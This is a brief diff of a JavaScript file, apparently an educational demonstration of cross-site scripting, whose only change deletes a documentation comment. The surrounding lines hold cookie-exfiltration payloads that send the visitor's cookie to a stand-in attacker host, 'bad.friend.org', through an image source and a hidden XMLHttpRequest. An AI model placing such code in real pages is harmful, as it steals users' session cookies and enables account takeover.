@@ -24,8 +24,6 @@ let url = `http://bad.friend.org/picture.jpg?$yourCookies={yourCookie}`;
 document.getElementsByTagName('image')[0].src = url;
 
 // AJAX - Unnoticed by the typical user, low-profile payload
-
-// string template https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals
 url = `http://bad.friend.org/gimmie?yourCookies=${yourCookie}`;
 let xhr = new XMLHttpRequest();
 xhr.open('GET', url, true);
